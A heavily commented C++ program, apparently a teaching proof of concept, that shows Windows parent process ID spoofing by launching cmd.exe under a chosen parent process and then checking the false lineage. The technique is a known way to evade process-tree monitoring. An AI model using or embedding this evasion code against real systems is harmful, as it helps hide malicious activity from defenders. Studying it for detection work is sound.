
// Define UNICODE and _UNICODE before including Windows.h.
// This ensures that all Windows API functions and C runtime functions default to their
// wide-character (wchar_t) versions, which is the modern standard for Windows development.
#define UNICODE
#define _UNICODE

#include <Windows.h>  // Core Windows API declarations (Handles, Processes, etc.)
#include <iostream>   // For console input/output (wcout for wide-character strings)
#include <tlhelp32.h> // Required for the "Tool Help" library functions like CreateToolhelp32Snapshot

// Use the standard namespace to avoid repeatedly typing "std::"
using namespace std;

/**
 * @brief Retrieves the Process ID (PID) of the parent of a given process.
 * @param pid The Process ID of the child process to query.
 * @return The Parent Process ID (DWORD). Returns 0 if the process is not found or an error occurs.
 */
DWORD GetParentPID(DWORD pid)
{
    // PROCESSENTRY32 is a structure that will be filled with information about a single process.
    PROCESSENTRY32 pe;
    // The dwSize member of the structure must be set to its size in bytes before calling any Tool Help functions.
    pe.dwSize = sizeof(pe);

    // Create a "snapshot" of the system, which is a read-only copy of the process and thread information at a moment in time.
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, // Specifies that we want to capture information about all running processes.
        0                   // A PID of 0 means we want a snapshot of the entire system, not just one process's heaps or modules.
    );
    // If the function fails, it returns a special value. We must check for this.
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0; // Return 0 to indicate failure.

    // Process32First retrieves information about the first process recorded in the snapshot.
    // We use the wide-character version (Process32FirstW) because UNICODE is defined.
    if (Process32FirstW(hSnap, &pe))
    {
        // Loop through the processes in the snapshot one by one.
        do
        {
            // Check if the PID of the current process in the snapshot matches the PID we are looking for.
            if (pe.th32ProcessID == pid)
            {
                // If we found the process, we don't need to search anymore.
                CloseHandle(hSnap);            // It's crucial to close the snapshot handle to free system resources.
                return pe.th32ParentProcessID; // Return the parent's PID from the structure.
            }
        } while (Process32NextW(hSnap, &pe)); // Move to the next process in the snapshot.
    }

    // If the loop finishes without finding the process, we must still close the handle.
    CloseHandle(hSnap);
    return 0; // Return 0 to indicate that the specified PID was not found in the snapshot.
}

/**
 * @brief Main entry point of the application.
 * @param argc Count of command-line arguments.
 * @param argv Array of command-line argument strings.
 */
int main(int argc, char *argv[])
{
    // --- Argument Parsing ---
    // Check if the user provided a command-line argument for the PID.
    if (argc < 2)
    {
        // If not, print usage instructions and exit. `argv[0]` is the name of the executable.
        cout << "Usage: " << argv[0] << " <TargetParentPID>" << endl;
        cout << "Example: " << argv[0] << " 1234" << endl;
        return 1; // Exit with an error code.
    }

    // Convert the first argument (which is a string) to an integer. This will be our target parent PID.
    DWORD targetPID = atoi(argv[1]);
    wcout << L"[*] Target Parent PID to spoof: " << targetPID << endl;

    // --- Step 1: Get a handle to the target parent process ---
    // We need to "open" the process we want to impersonate as the parent.
    HANDLE hParent = OpenProcess(
        // We request specific permissions (access rights).
        PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, // PROCESS_CREATE_PROCESS is required to use this handle as a parent.
        FALSE,                                              // bInheritHandle: FALSE means this handle won't be inherited by child processes.
        targetPID                                           // The PID of the process we want to open.
    );
    // If OpenProcess fails, it returns NULL. We must check for this.
    if (hParent == NULL)
    {
        // GetLastError() provides the specific error code for why the function failed.
        wcout << L"[-] Failed to open target parent process. Error: " << GetLastError() << endl;
        return 1; // Exit with an error code.
    }
    wcout << L"[+] Successfully opened handle to target parent process." << endl;

    // --- Step 2: Prepare structures for process creation ---
    // STARTUPINFOEXW allows us to provide extended information, including an attribute list.
    // The 'W' suffix means it's the wide-character version.
    STARTUPINFOEXW siex = {sizeof(STARTUPINFOEXW)};
    // PROCESS_INFORMATION will be filled by CreateProcessW with info about the new process (like its PID and handles).
    PROCESS_INFORMATION pi = {0};

    // --- Step 3: Initialize the process attribute list ---
    // This is the core of the technique. We need to create a list of special attributes to pass to the new process.
    // The only attribute we will use is the one that specifies a parent process.

    // First, we must query the system for the size needed to hold our attribute list.
    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(
        NULL,         // Pass NULL to query for the required size.
        1,            // We plan to store exactly one attribute (the parent process).
        0,            // Reserved, must be 0.
        &attrListSize // The function will write the required buffer size here.
    );

    // Now, allocate memory of that size from the heap.
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), // Use the default heap for this process.
        HEAP_ZERO_MEMORY, // A flag that initializes the allocated memory to all zeros.
        attrListSize      // The size we determined in the previous step.
    );
    // Check if the memory allocation was successful.
    if (siex.lpAttributeList == NULL)
    {
        wcout << L"[-] Failed to allocate memory for attribute list. Error: " << GetLastError() << endl;
        CloseHandle(hParent); // Clean up the handle we opened earlier.
        return 1;
    }

    // With the memory allocated, we can now properly initialize it as an attribute list.
    if (!InitializeProcThreadAttributeList(
            siex.lpAttributeList, // Pointer to the allocated memory block.
            1,                    // The number of attributes we will store.
            0,                    // Reserved, must be 0.
            &attrListSize         // The size of the allocated block.
            ))
    {
        wcout << L"[-] Failed to initialize attribute list. Error: " << GetLastError() << endl;
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList); // Free the allocated memory.
        CloseHandle(hParent);                                // Clean up.
        return 1;
    }

    // --- Step 4: Set the parent process attribute in the list ---
    // Now we add the specific attribute to our list: the handle to our desired parent process.
    if (!UpdateProcThreadAttribute(
            siex.lpAttributeList,                 // The initialized attribute list.
            0,                                    // Flags, must be 0.
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, // The key for the attribute we want to set. This tells Windows we are specifying a parent.
            &hParent,                             // A pointer to the value of the attribute. In this case, a pointer to the handle.
            sizeof(HANDLE),                       // The size of the value being passed.
            NULL, NULL))                          // Reserved for previous value, not needed here.
    {
        wcout << L"[-] Failed to update attribute list with parent process. Error: " << GetLastError() << endl;
        DeleteProcThreadAttributeList(siex.lpAttributeList); // This function cleans up the attribute list's internal data.
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList); // Free the memory block itself.
        CloseHandle(hParent);                                // Clean up.
        return 1;
    }
    wcout << L"[+] Successfully set the parent process attribute." << endl;

    // --- Step 5: Create the child process with the spoofed parent ---
    // Now we call CreateProcessW, but with special flags to use our attribute list.
    if (
        !CreateProcessW(
            L"C:\\Windows\\System32\\cmd.exe",             // Path to the executable to launch. Must be a wide-character string.
            NULL,                                              // Command line arguments for the new process (none in this case).
            NULL,                                              // Process security attributes (default).
            NULL,                                              // Thread security attributes (default).
            FALSE,                                             // bInheritHandles: If TRUE, the new process would inherit handles from this one. We set to FALSE.
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, // CRITICAL FLAGS:
                                                               // EXTENDED_STARTUPINFO_PRESENT tells CreateProcess to use the `siex` structure instead of a simple STARTUPINFO.
                                                               // CREATE_NEW_CONSOLE gives the new process its own console window.
            NULL,                                              // Environment block (NULL means inherit from this process).
            NULL,                                              // Current directory (NULL means inherit).
            &siex.StartupInfo,                                 // A pointer to our STARTUPINFOEX structure. This is how the attribute list is passed.
            &pi                                                // A pointer to a PROCESS_INFORMATION structure that will receive the new process's info.
            ))
    {
        wcout << L"[-] Failed to create process. Error: " << GetLastError() << endl;
        // Perform full cleanup on failure.
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hParent);
        return 1;
    }

    // If CreateProcessW succeeds, the `pi` structure now contains the PID of the new process.
    wcout << L"[+] Process created successfully with PID: " << pi.dwProcessId << endl;

    // --- Verification Step ---
    // Use our helper function to check the parent PID of the newly created process.
    // NOTE: There can be a slight delay (a race condition) before the new process is visible in a system snapshot.
    // A small sleep can help, but a more robust solution would be to retry GetParentPID in a loop.
    wcout << L"[*] Verifying parent PID..." << endl;
    DWORD spoofedParent = GetParentPID(pi.dwProcessId);
    wcout << L"[+] Parent PID according to snapshot: " << spoofedParent << endl;
    if (spoofedParent == targetPID)
    {
        wcout << L"[+] SUCCESS: Parent PID appears to be spoofed correctly." << endl;
    }
    else
    {
        wcout << L"[!] FAILURE: Parent PID does not match the target." << endl;
    }

    // A delay to keep the new process alive for a few seconds so you can observe it in tools like Process Hacker or Process Explorer.
    Sleep(5000);

    // --- Step 6: Cleanup ---
    // It is critical to free all resources and close all handles to prevent memory and resource leaks.
    wcout << L"[*] Cleaning up resources..." << endl;
    DeleteProcThreadAttributeList(siex.lpAttributeList); // Clean up the attribute list's internal data.
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList); // Free the memory we allocated for the list.
    CloseHandle(hParent);                                // Close the handle to the target parent process.
    CloseHandle(pi.hProcess);                            // Close the handle to the new child process.
    CloseHandle(pi.hThread);                             // Close the handle to the main thread of the new child process.

    wcout << L"[*] Cleanup complete. Exiting." << endl;
    return 0; // Return 0 for success.
}
